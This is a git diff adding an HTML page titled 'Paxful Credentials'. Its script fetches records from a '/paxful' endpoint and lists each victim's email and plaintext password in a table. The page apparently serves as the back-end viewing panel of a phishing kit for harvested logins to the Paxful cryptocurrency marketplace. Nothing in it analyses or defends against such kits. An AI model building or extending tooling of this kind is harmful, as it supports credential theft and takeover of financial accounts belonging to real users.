@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Paxful Credentials</title>
+</head>
+<body>
+  <h1>Paxful Credentials</h1>
+
+  <h2>Paxful Logins</h2>
+  <table border="1">
+    <thead>
+      <tr>
+        <th>Email</th>
+        <th>Password</th>
+      </tr>
+    </thead>
+    <tbody id="paxfulTable">
+      <!-- Rows will be added here dynamically -->
+    </tbody>
+  </table>
+
+  <script>
+    // Fetch and display items from MongoDB
+    async function getPaxfuls() {
+      try {
+        const response = await fetch('/paxful');
+        if (!response.ok) {
+          throw new Error('Failed to fetch data');
+        }
+        const paxfuls = await response.json();
+        const paxfulTable = document.getElementById('paxfulTable');
+        paxfulTable.innerHTML = ''; // Clear the table before adding new rows
+        paxfuls.forEach(paxful => {
+          const row = document.createElement('tr');
+          const emailCell = document.createElement('td');
+          const passwordCell = document.createElement('td');
+
+          emailCell.textContent = paxful.email;
+          passwordCell.textContent = paxful.password;
+
+          row.appendChild(emailCell);
+          row.appendChild(passwordCell);
+          paxfulTable.appendChild(row);
+        });
+      } catch (error) {
+        console.error('Error fetching Paxful credentials:', error);
+      }
+    }
+
+    // Get items initially
+    getPaxfuls();
+  </script>
+</body>
+</html>
